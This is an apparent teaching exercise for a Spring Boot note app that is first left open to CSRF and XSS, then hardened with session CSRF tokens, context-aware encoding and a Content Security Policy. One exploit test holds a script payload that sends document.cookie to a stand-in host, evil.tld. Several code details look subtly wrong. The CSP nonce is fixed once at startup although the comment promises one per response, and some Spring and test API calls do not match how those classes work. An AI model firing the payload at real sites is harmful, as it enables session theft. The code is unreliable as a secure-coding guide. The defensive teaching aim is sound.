# CSRF & XSS Protection - MINI PROJECT

## Project: SafeNotes — a note-sharing app that you will first break, then defend

Build a deliberately vulnerable Spring Boot app, prove the XSS and CSRF attacks succeed,
then fix both properly and prove the attacks now fail. The exploit-then-defend loop is
the point of this project.

### Architecture

```
ATTACK PHASE                            DEFENCE PHASE
  attacker page                          note HTML body rendered with
     │  auto-submit POST                   context-aware encoding
     ▼  (browser attaches cookies)      note JS strings encoded for JS
  /notes  (no token check)              /notes  (synchroniser token verified)
     │  201 Created, cookie session              │  403 on missing/mismatched token
     ▼                                        ▼
  /search?q=<script>…</script>          /search?q=<script>…</script>  → escaped in output
  200, reflected raw                    200, rendered as text + CSP blocks inline exec
```

### Implementation

**Exploit (proof it works before you fix it):**

```java
@Test void csrfAttackSucceedsBeforeFix() throws Exception {
    try (MockHttpSession victim = loginAs("alice")) {
        // The attacker's page auto-submits this. The victim's browser attaches the cookie.
        mockMvc.perform(post("/notes").param("body", "pwned").param("_csrf", "")   // no token
                       .session(victim))
               .andExpect(status().isCreated());
    }
}

@Test void xssIsReflectedBeforeFix() throws Exception {
    String payload = "<script>fetch('https://evil.tld/?c='+document.cookie)</script>";
    String body = mockMvc.perform(get("/search").param("q", payload))
                        .andReturn().getResponse().getContentAsString();
    assertThat(body).contains(payload);   // RAW - vulnerable
}
```

**Fix 1 — CSRF synchroniser token (server-side, tied to the session):**

```java
@Bean
SecurityFilterChain chain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf
            .csrfTokenRepository(new HttpSessionCsrfTokenRepository())   // store in session
            .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())  // plain, for tests)
            // Expire tokens on auth change so a fixation attempt cannot ride the old token.
            .sessionAuthenticationStrategy(s -> s.sessionAuthenticationStrategy(
                    new ChangeSessionIdAuthenticationStrategy()))
            .and())
        .authorizeHttpRequests(a -> a.anyRequest().authenticated())
        .build();
}
// A real HTML form must echo the token; Thymeleaf does this automatically with
// th:action, which is why template engines pair so well with CSRF.
```

**Fix 2 — context-aware output encoding (the real XSS fix):**

```java
@Service
class NoteViewRenderer {
    private final HtmlUtils html = new HtmlUtils();   // org.springframework.web.util.HtmlUtils

    String renderForHtmlBody(String userText) {
        return html.htmlEscape(userText);            // & < > " '  -> entities
    }

    /** A value injected into a JS string literal needs JS escaping, NOT HTML escaping. */
    String renderForJsString(String userText) {
        String jsSafe = userText.replace("\\", "\\\\").replace("'", "\\'")
                                .replace("\n", "\\n").replace("<", "\\u003c")
                                .replace(">", "\\u003e").replace("&", "\\u0026")
                                .replace("/", "\\/");   // blocks </script> breakout
        return jsSafe;
    }

    String renderForUrlParam(String userText) {
        return URLEncoder.encode(userText, StandardCharsets.UTF_8);
    }
}
```

**Fix 3 — CSP as containment (the second layer when encoding is missed):**

```java
// No unsafe-inline. Nonces per response. report-uri feeds a triage endpoint.
@Bean
SecurityFilterChain csp(HttpSecurity http) throws Exception {
    return http.headers(h -> h
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; " +
                              "script-src 'self' 'nonce-" + nonceProvider.get() + "'; " +
                              "style-src 'self'; " +
                              "img-src 'self' data:; " +
                              "object-src 'none'; " +
                              "base-uri 'self'; " +
                              "frame-ancestors 'none'; " +
                              "form-action 'self'; " +
                              "report-uri /csp-report"))
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true).maxAgeInSeconds(31536000).preload(true)));
}
```

### Test It

```java
@Test void csrfAttackNowFails() throws Exception {
    try (MockHttpSession victim = loginAs("alice")) {
        mockMvc.perform(post("/notes").param("body", "pwned").param("_csrf", "").session(victim))
               .andExpect(status().isForbidden());
    }
}

@Test void xssIsEncodedAfterFix() throws Exception {
    String payload = "<script>alert(1)</script>";
    String body = mockMvc.perform(get("/search").param("q", payload))
                        .andReturn().getResponse().getContentAsString();
    assertThat(body).doesNotContain(payload).contains("&lt;script&gt;");
}

@Test void cspBlocksInlineScript() {
    // Even if an encoder is missed, the browser refuses to execute the injected inline script.
    assertThat(cspHeader).contains("script-src 'self'").doesNotContain("unsafe-inline");
}
```

## Deliverables

- [ ] Vulnerable baseline with passing exploit tests (prove the attack first)
- [ ] `HttpSessionCsrfTokenRepository` synchroniser token wired into the chain
- [ ] `SameSite` cookie attributes on the session cookie
- [ ] Context-aware encoders: HTML body, HTML attribute, JS string, URL
- [ ] CSP with nonce, no `unsafe-inline`, plus `frame-ancestors 'none'`
- [ ] HSTS with `max-age`, `includeSubDomains`, and `preload`
- [ ] `/csp-report` ingestion endpoint and a triage checklist in the README
- [ ] Tests proving every exploit from the baseline now fails
